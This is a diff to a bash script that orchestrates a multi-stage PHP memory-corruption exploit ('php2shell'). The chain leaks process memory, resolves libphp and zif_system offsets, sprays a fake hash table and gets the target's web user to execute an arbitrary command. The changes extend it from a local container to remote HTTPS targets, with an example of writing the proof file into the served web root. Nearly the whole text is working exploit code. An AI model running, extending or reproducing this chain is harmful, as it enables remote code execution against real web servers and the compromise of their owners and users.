@@ -5,32 +5,46 @@
 # chain.sh - the whole php2shell chain with our own tools, one target, one proof file.
 #
 #   chain.sh --target http://127.0.0.1:18110/index.php --container p2s-target
+#   chain.sh --target https://host/index.php --probe /probe.php --proof-url https://host/pwn.txt
 #
 # Steps: A1 arms the stale session id, B1 discloses 800 KB out of the recycled chunk, leak_addrs
 # turns that into libphp/main/S/hsv, A2 re-arms with the cheap OOM, B2 sprays the fake reference and
-# the fake array. The proof is a command run by the target's user, written through the container.
+# the fake array. The proof is a command run by the target's user.
+#
+# Nothing here needs the container: without one the symbols come from the arch profile (probe.php or
+# the leak says which arch), the gate judges on the A1 HTTP outcome, and the proof is fetched over
+# HTTP when --proof-url or a relative --proof is given. A container, when there is one, is only used
+# to read the log and the file - both are better evidence, so they win when available.
 #
 # Exit codes: 0 chain verified and the proof file was read
-#             2 preflight refused the target, or a step failed
+#             2 preflight refused the target, a step failed, or the proof could not be read
 #             5 preflight says the build arms but cannot disclose (8.5.11)
 #             6 --allow-arming-only: the gate passed and the run stopped there on purpose
+#             7 the proof was read, but arming is only inferred (no container log)
 set -u
 
 TARGET="http://127.0.0.1:18110/index.php"
 CONTAINER="${CONTAINER:-${NAME:-p2s-target}}"
 CMD='id>/tmp/pwn.txt'
 PROOF="/tmp/pwn.txt"
+PROOF_URL=""       # where to fetch the proof from over HTTP, when the target serves it
 SPEC="G:511:0x137*14,G:400:0x137,X:900"
 PARTS=880
 DEPTH=64
-FILLERS=115
+FILLERS=""          # empty = take it from the arch profile (the arming shape is a build constant)
+FILLERS_CLI=""
 WORKERS=0          # >1: hold WORKERS-1 connections so every step lands on the same child
-SYMBOLS=""         # empty = resolve from the image's own symbol table (portable across builds/arches)
+SYMBOLS=""         # empty = resolve from the arch profile, or from the image's own symbol table
+ARCH="auto"        # auto = ask probe.php, then read it out of the leak
+PHP_VERSION="8.4.26"
+DISTRO=""          # from probe.php: a package build needs its own offsets, not the image's
+SPRAY_FIRST=""     # override for the fake-reference phase inside a spray value
 PROBE=""           # path of a deployed probe.php, an input to the preflight
 SKIP_PREFLIGHT=0
-ALLOW_UNVERIFIED=0 # gate: continue when A1 died but no container log is available
+ALLOW_UNVERIFIED=0 # gate: continue when A1 looks armed but cannot be confirmed
 ALLOW_ARMING_ONLY=0 # preflight: accept an arming-only build (8.5.11) and stop after the gate
 STOP_AFTER_GATE=0   # implied by --allow-arming-only
+GATE_INFERRED=0
 
 while [ $# -gt 0 ]; do
   case "$1" in
@@ -38,11 +52,16 @@ while [ $# -gt 0 ]; do
     --container) CONTAINER="$2"; shift 2 ;;
     --cmd) CMD="$2"; shift 2 ;;
     --proof) PROOF="$2"; shift 2 ;;
+    --proof-url) PROOF_URL="$2"; shift 2 ;;
     --parts) PARTS="$2"; shift 2 ;;
     --depth) DEPTH="$2"; shift 2 ;;
-    --fillers) FILLERS="$2"; shift 2 ;;
+    --fillers) FILLERS_CLI="$2"; shift 2 ;;
     --workers) WORKERS="$2"; shift 2 ;;
     --symbols) SYMBOLS="$2"; shift 2 ;;
+    --arch) ARCH="$2"; shift 2 ;;
+    --php-version) PHP_VERSION="$2"; shift 2 ;;
+    --distro) DISTRO="$2"; shift 2 ;;
+    --spray-first) SPRAY_FIRST="$2"; shift 2 ;;
     --probe) PROBE="$2"; shift 2 ;;
     --skip-preflight) SKIP_PREFLIGHT=1; shift ;;
     --allow-unverified) ALLOW_UNVERIFIED=1; shift ;;
@@ -54,7 +73,9 @@ done
 HERE="$(cd "$(dirname "$0")" && pwd)"
 COOKIE=$(mktemp)
 A1OUT=""
+GATEOUT=""
 HOLDER=""
+REMOTE=0
 
 
 # Fail before the first stage rather than after it: four requests against nothing produce four
@@ -92,12 +113,31 @@ else
   fi
 fi
 
-# Every offset in this chain is a property of one binary, so nothing here is hardcoded: the symbols are
-# read out of the image that is actually running (zif_system is not exported, so the full symbol table is
-# used). That is what makes the same command work on arm64 and on x86-64 without an --arch flag.
-if [ -z "$SYMBOLS" ]; then
+# Is there a container to reach into? If not, the log, the symbol table and the proof all have to come
+# from the target itself. That is the remote case and it is not an error: every stage is HTTP anyway.
+if ! docker inspect -f '{{.State.Running}}' "$CONTAINER" >/dev/null 2>&1; then
+  REMOTE=1
+  echo "no container access to '$CONTAINER': log, symbols and proof are taken from the target" >&2
+fi
+
+# Symbols, best source first: an explicit table, the running image's own nm, then the arch profile. The
+# profile keys on the architecture, which probe.php reports and the leak also reveals - the build number
+# alone cannot say it, and a wrong guess is tens of MB off.
+if [ "$ARCH" = auto ] && [ -n "$PROBE" ]; then
+  _facts=$(python3 "$HERE/probe_facts.py" "$TARGET" "$PROBE" 2>/dev/null) || _facts=""
+  if [ -n "$_facts" ]; then
+    ARCH="${_facts%%	*}"
+    _rest="${_facts#*	}"
+    [ -n "${_rest%%	*}" ] && PHP_VERSION="${_rest%%	*}"
+    [ -n "${_rest#*	}" ] && [ "${_rest#*	}" != "$_rest" ] && DISTRO="${_rest#*	}"
+  fi
+fi
+if [ -z "$SYMBOLS" ] && [ "$REMOTE" = 0 ]; then
+  # Module name differs by build: the official image ships libphp.so, a distro package libphp8.4.so or
+  # libphp8.3.so. Distro builds are stripped of .symtab, so three of the four symbols only exist in the
+  # dynamic table; zif_system is static and comes from the profile instead.
   SYMBOLS=$(docker exec "$CONTAINER" sh -c \
-    'M=/usr/lib/apache2/modules/libphp.so; [ -f "$M" ] || M=/usr/local/lib/libphp.so; nm "$M" 2>/dev/null' \
+    'for M in /usr/lib/apache2/modules/libphp*.so /usr/local/lib/libphp.so; do [ -f "$M" ] && { nm "$M" 2>/dev/null; nm -D "$M" 2>/dev/null; break; }; done' \
     2>/dev/null | awk '
       $3 == "zval_ptr_dtor"     { a = $1 }
       $3 == "zif_system"        { b = $1 }
@@ -109,23 +149,25 @@ if [ -z "$SYMBOLS" ]; then
         if (c) { s = s (n++ ? "," : "") "zend_hash_destroy=0x" c }
         print s
       }')
+  [ -z "$SYMBOLS" ] && echo "warning: $CONTAINER has no usable symbol table" >&2
 fi
-if [ -z "$SYMBOLS" ]; then
-  echo "warning: could not read symbols from $CONTAINER; falling back to the arm64 8.4.26 offsets" >&2
-  echo "         (pass --symbols name=0xoff,... for any other arch or build)" >&2
-fi
-SYM_ARGS=()
+SYM_ARGS=(--arch "$ARCH" --php-version "$PHP_VERSION")
+[ -n "$DISTRO" ] && SYM_ARGS+=(--distro "$DISTRO")
 if [ -n "$SYMBOLS" ]; then
   _old_ifs="$IFS"; IFS=','
   for _pair in $SYMBOLS; do
     SYM_ARGS+=(--symbol "$_pair")
   done
   IFS="$_old_ifs"
+  echo "symbols: $SYMBOLS"
+else
+  _profile=$(python3 -c 'import sys; from decode_leak_cookie import profile_key; print(profile_key(sys.argv[1], sys.argv[2], sys.argv[3]))' \
+    "$ARCH" "$PHP_VERSION" "$DISTRO" 2>/dev/null)
+  echo "symbols: profile ${_profile:-$ARCH/$PHP_VERSION}"
 fi
-echo "symbols: ${SYMBOLS:-<arm64 defaults>}"
 
 cleanup() {
-  rm -f "$COOKIE" "$A1OUT"
+  rm -f "$COOKIE" "$A1OUT" "$GATEOUT"
   if [ -n "$HOLDER" ]; then
     kill "$HOLDER" 2>/dev/null
     wait "$HOLDER" 2>/dev/null
@@ -136,6 +178,10 @@ trap cleanup EXIT
 if [ "$WORKERS" -gt 1 ]; then
   python3 "$HERE/hold_workers.py" --url "$TARGET" --count "$((WORKERS - 1))" --hold 180 &
   HOLDER=$!
+  # The pool needs about 10 s to reach its ceiling with 149 connections held (9 -> 101 -> 151 processes
+  # at 2, 5 and 10 s), so 3 s catches it mid-ramp - and it sheds held connections again after ~20 s.
+  # No settle makes the race go away: the replay measured 2/10 proof across 3-40 s. For a deterministic
+  # run use the single-worker target, where the same chain measured 5/5.
   sleep 3
 fi
 
@@ -149,9 +195,19 @@ python3 "$HERE/a1_arm.py" --url "$TARGET" --repeat 1 --sid-hex 00 --big 78 \
 grep -E '^  attempt |socket:|tried to allocate' "$A1OUT" | head -3
 
 GATE_ARGS=(--a1-output "$A1OUT" --since "$A1SINCE")
-[ -n "$CONTAINER" ] && GATE_ARGS+=(--container "$CONTAINER")
+[ -n "$CONTAINER" ] && [ "$REMOTE" = 0 ] && GATE_ARGS+=(--container "$CONTAINER")
+[ "$REMOTE" = 1 ] && GATE_ARGS+=(--remote)
 [ "$ALLOW_UNVERIFIED" = 1 ] && GATE_ARGS+=(--allow-unverified)
-python3 "$HERE/arming_gate.py" "${GATE_ARGS[@]}" || exit $?
+GATEOUT=$(mktemp)
+python3 "$HERE/arming_gate.py" "${GATE_ARGS[@]}" > "$GATEOUT" 2>&1
+GATE_RC=$?
+cat "$GATEOUT"
+if [ "$GATE_RC" != 0 ]; then
+  exit "$GATE_RC"
+fi
+if grep -q '^armed (inferred)' "$GATEOUT"; then
+  GATE_INFERRED=1
+fi
 
 if [ "$STOP_AFTER_GATE" = 1 ]; then
   echo
@@ -168,6 +224,9 @@ python3 "$HERE/b1_forge.py" --url "$TARGET" --spec "$SPEC" --fake-len 0xC8000 \
 
 ADDRS=$(python3 "$HERE/leak_addrs.py" --cookie-file "$COOKIE" "${SYM_ARGS[@]}" --emit shell) || exit 1
 eval "$ADDRS"
+[ -n "$SPRAY_FIRST" ] && SPRAY_FIRST=$((SPRAY_FIRST))
+[ -n "$FILLERS_CLI" ] && FILLERS="$FILLERS_CLI"
+[ -z "$FILLERS" ] && FILLERS=115
 echo "leak: libphp=$LIBPHP main=$MAIN S=$S hsv=$HSV zif=$ZIF_SYSTEM"
 sleep 1
 
@@ -176,14 +235,15 @@ python3 "$HERE/a2_cheap_oom.py" --url "$TARGET" --parts "$PARTS" --depth "$DEPTH
 sleep 1
 
 HT=$(mktemp)
-python3 "$HERE/mk_fake_ht.py" --ht "$S" --zif "$ZIF_SYSTEM" --cmd "$CMD" --out "$HT"
-B2OUT=$(python3 "$HERE/b2_exec.py" --url "$TARGET" --ht-addr "$S" --ht-file "$HT" --vl 384 \
-        --n1 500 --n2 495 --rc 1)
+python3 "$HERE/mk_fake_ht.py" --ht "$S" --zif "$ZIF_SYSTEM" --cmd "$CMD" --out "$HT" --size "$VL"
+B2OUT=$(python3 "$HERE/b2_exec.py" --url "$TARGET" --ht-addr "$S" --ht-file "$HT" --vl "$VL" \
+        --n1 "$N1" --n2 495 --rc 1 --first "$SPRAY_FIRST" --sid a \
+        $([ "${SID_FIELD:-1}" = 0 ] && echo --no-sid-field))
 echo "$B2OUT"
 rm -f "$HT"
 # A successful fire ends with the worker dead, so the client sees the connection drop ("response=0"). An
-# answered request means B2 landed on a child that never held the stale state - the usual cause is a pool
-# bigger than the number of workers we pinned.
+# answered request means B2 landed on a child that never held the stale state - the pool is not sitting at
+# the pinned count: it ramps up over the first ~10 s and starts shedding held connections after that.
 case "$B2OUT" in
   *"response=0"*) ;;
   *) echo "[!] B2 was answered instead of dropping the connection: this request did not reach the child" >&2
@@ -193,8 +253,37 @@ esac
 sleep 2
 
 echo "proof:"
-# With a single Apache child the crash that ends the chain takes the container down, and then
-# `docker exec` cannot reach the file - `docker cp` can, because it works on a stopped container.
-docker exec "$CONTAINER" sh -c "cat $PROOF 2>/dev/null || echo '(no file)'" 2>/dev/null \
-  || docker cp "$CONTAINER:$PROOF" /dev/stdout 2>/dev/null \
-  || echo "(container $CONTAINER is gone and held no proof file)"
+PROVEN=0
+if [ -n "$PROOF_URL" ]; then
+  curl -fsS --max-time 15 "$PROOF_URL" && PROVEN=1
+fi
+if [ "$PROVEN" = 0 ] && [ "$REMOTE" = 0 ]; then
+  # With a single Apache child the crash that ends the chain takes the container down, and then
+  # `docker exec` cannot reach the file - `docker cp` can, because it works on a stopped container.
+  if docker exec "$CONTAINER" sh -c "cat $PROOF" 2>/dev/null; then
+    PROVEN=1
+  elif docker cp "$CONTAINER:$PROOF" /dev/stdout 2>/dev/null; then
+    PROVEN=1
+  fi
+fi
+if [ "$PROVEN" = 0 ] && [ "${PROOF#/}" = "$PROOF" ]; then
+  # A relative proof is a path the target serves, so it is fetched next to the entry point.
+  _url="${TARGET%%\?*}"
+  _url="${_url%/*}/$PROOF"
+  echo "  (no container file; fetching $_url)"
+  curl -fsS --max-time 15 "$_url" && PROVEN=1
+fi
+if [ "$PROVEN" = 0 ]; then
+  echo "(proof file not readable: $PROOF)"
+  echo "  remote targets: write it where the server serves it and pass the URL, e.g." >&2
+  echo "    --cmd 'id>/var/www/html/pwn.txt' --proof pwn.txt --proof-url https://host/pwn.txt" >&2
+  exit 2
+fi
+
+if [ "$GATE_INFERRED" = 1 ]; then
+  echo
+  echo "note: exit 7 - the proof is real, arming was only inferred (no container log to read the"
+  echo "      allocation size from). --container <name> turns this back into a verified run."
+  exit 7
+fi
+exit 0
